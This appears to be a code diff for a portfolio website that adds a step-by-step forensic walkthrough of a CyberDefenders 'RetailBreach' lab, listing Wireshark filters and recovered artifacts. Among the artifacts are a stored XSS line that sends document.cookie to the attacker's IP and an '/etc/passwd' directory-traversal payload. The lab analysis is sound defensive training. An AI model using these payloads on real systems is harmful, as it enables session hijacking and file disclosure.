@@ -238,6 +238,44 @@ const jetbrainsSteps = [
     }
 ];
 
+const retailBreachSteps = [
+    {
+        step: "Step 1",
+        title: "Identifying the Attacker's IP Address",
+        content: `<strong>Lab Question:</strong> What is the attacker's IP address?\n\n- <strong>Investigation Approach:</strong> Open the PCAP file in Wireshark and go to <em>Statistics > Conversations > IPv4</em> or filter for abnormal HTTP 404 responses.\n- <strong>Wireshark Filter:</strong> <code>http.response.code == 404</code>\n- <strong>Key Artifact:</strong> <code>111.224.180.128</code>`
+    },
+    {
+        step: "Step 2",
+        title: "Identifying the Directory Brute-Forcing Tool",
+        content: `<strong>Lab Question:</strong> Which tool did the attacker use to perform the brute-forcing?\n\n- <strong>Investigation Approach:</strong> Filter traffic originating from the attacker IP and inspect the HTTP <code>User-Agent</code> header in early reconnaissance streams.\n- <strong>Wireshark Filter:</strong> <code>ip.src == 111.224.180.128 and http</code>\n- <strong>Key Artifact:</strong> <code>gobuster</code>`
+    },
+    {
+        step: "Step 3",
+        title: "Extracting the Stored XSS Payload",
+        content: `<strong>Lab Question:</strong> Can you specify the XSS payload used to compromise the web application?\n\n- <strong>Investigation Approach:</strong> Filter for POST requests targeting user reviews and decode the payload body using CyberChef URL Decode.\n- <strong>Wireshark Filter:</strong> <code>ip.src == 111.224.180.128 && http.request.method == "POST" && frame contains "script"</code>\n- <strong>Key Artifact:</strong> <code>fetch('http://111.224.180.128/' + document.cookie);</code>`
+    },
+    {
+        step: "Step 4",
+        title: "Determining Admin Interaction Timestamp",
+        content: `<strong>Lab Question:</strong> Provide the UTC timestamp when the admin user first visited the malicious page.\n\n- <strong>Investigation Approach:</strong> Isolate requests made by the legitimate administrator IP (<code>135.143.142.5</code>) to the reviews section and check arrival timestamps.\n- <strong>Wireshark Filter:</strong> <code>ip.src == 135.143.142.5 && http.request.uri contains "reviews"</code>\n- <strong>Key Artifact:</strong> <code>2024-03-29 12:09</code> UTC`
+    },
+    {
+        step: "Step 5",
+        title: "Extracting the Stolen Session Token",
+        content: `<strong>Lab Question:</strong> Provide the session token acquired and used for unauthorized access.\n\n- <strong>Investigation Approach:</strong> Locate the session cookie transmitted back during admin interaction or observe subsequent requests from the attacker IP.\n- <strong>Wireshark Filter:</strong> <code>http.cookie contains "PHPSESSID"</code>\n- <strong>Key Artifact:</strong> <code>lqkctf24s9h9lg67teu8uevn3q</code>`
+    },
+    {
+        step: "Step 6",
+        title: "Identifying the Exploited Administrative Script",
+        content: `<strong>Lab Question:</strong> What is the name of the script that was exploited by the attacker?\n\n- <strong>Investigation Approach:</strong> Filter attacker traffic utilizing the hijacked admin session cookie to locate accessed admin scripts.\n- <strong>Wireshark Filter:</strong> <code>ip.src == 111.224.180.128 && frame contains "lqkctf24s9h9lg67teu8uevn3q"</code>\n- <strong>Key Artifact:</strong> <code>log_viewer.php</code>`
+    },
+    {
+        step: "Step 7",
+        title: "Isolating the Directory Traversal Payload",
+        content: `<strong>Lab Question:</strong> Identify the specific payload used to access a sensitive system file.\n\n- <strong>Investigation Approach:</strong> Examine parameters passed via URI to the vulnerable script containing path traversal sequences.\n- <strong>Wireshark Filter:</strong> <code>ip.src == 111.224.180.128 && http.request.uri contains "log_viewer.php"</code>\n- <strong>Key Artifact:</strong> <code>../../../../../etc/passwd</code>`
+    }
+];
+
 /* ==========================================================================
    5. Modal & Carousel Render Functions
    ========================================================================== */
@@ -341,6 +379,52 @@ function renderJetbrainsCarousel() {
     });
 }
 
+let currentRetailIndex = 0;
+
+function renderRetailCarousel() {
+    const stepData = retailBreachSteps[currentRetailIndex];
+
+    let optionsHtml = '';
+    retailBreachSteps.forEach((st, index) => {
+        optionsHtml += `<option value="${index}" ${index === currentRetailIndex ? 'selected' : ''}>${st.step}: ${st.title}</option>`;
+    });
+
+    modalDesc.innerHTML = `
+        <div class="carousel-container">
+            <div class="carousel-nav">
+                <button id="prevRetailBtn" class="btn btn--outline btn--small" ${currentRetailIndex === 0 ? 'disabled' : ''}>&larr; Prev</button>
+                <select id="retailSelect" class="carousel-select">
+                    ${optionsHtml}
+                </select>
+                <button id="nextRetailBtn" class="btn btn--outline btn--small" ${currentRetailIndex === retailBreachSteps.length - 1 ? 'disabled' : ''}>Next &rarr;</button>
+            </div>
+            <div class="carousel-card">
+                <h4>${stepData.title}</h4>
+                <div class="carousel-body">${stepData.content.replace(/\n/g, '<br>')}</div>
+            </div>
+        </div>
+    `;
+
+    document.getElementById('prevRetailBtn')?.addEventListener('click', () => {
+        if (currentRetailIndex > 0) {
+            currentRetailIndex--;
+            renderRetailCarousel();
+        }
+    });
+
+    document.getElementById('nextRetailBtn')?.addEventListener('click', () => {
+        if (currentRetailIndex < retailBreachSteps.length - 1) {
+            currentRetailIndex++;
+            renderRetailCarousel();
+        }
+    });
+
+    document.getElementById('retailSelect')?.addEventListener('change', (e) => {
+        currentRetailIndex = parseInt(e.target.value);
+        renderRetailCarousel();
+    });
+}
+
 /* ==========================================================================
    6. Project Details Registry & Open Modal Trigger
    ========================================================================== */
@@ -353,6 +437,13 @@ const projectDetails = {
     },
     'jetbrains-lab': {
         title: 'LetsDefend / CyberDefenders: JetBrains Security Incident',
+        desc: '',
+        repo: '',
+        otw: '',
+        cyberDefenders: 'https://cyberdefenders.org/p/bshpx/?tab=labs'
+    },
+    'retailbreach-lab': {
+        title: 'CyberDefenders: RetailBreach Lab Walkthrough',
         desc: '',
         repo: '',
         otw: '',
@@ -378,7 +469,13 @@ openModalButtons.forEach(button => {
                 modalOtwLink.style.display = 'none';
                 modalCyberDefendersLink.setAttribute('href', data.cyberDefenders);
                 modalCyberDefendersLink.style.display = 'inline-block';
-            } else {
+            } else if (projectId === 'retailbreach-lab' && data.cyberDefenders) {
+                modalRepoLink.style.display = 'none';
+                modalOtwLink.style.display = 'none';
+                modalCyberDefendersLink.setAttribute('href', data.cyberDefenders);
+                modalCyberDefendersLink.style.display = 'inline-block';
+            }
+            else {
                 modalOtwLink.style.display = 'none';
                 modalCyberDefendersLink.style.display = 'none';
                 modalRepoLink.style.display = 'inline-block';
@@ -390,7 +487,10 @@ openModalButtons.forEach(button => {
             } else if (projectId === 'jetbrains-lab') {
                 currentJetbrainsIndex = 0;
                 renderJetbrainsCarousel();
-            } else {
+            } else if (projectId === 'retailbreach-lab') {
+                currentRetailIndex = 0;
+                renderRetailCarousel();
+            }else {
                 modalDesc.textContent = data.desc;
             }
 
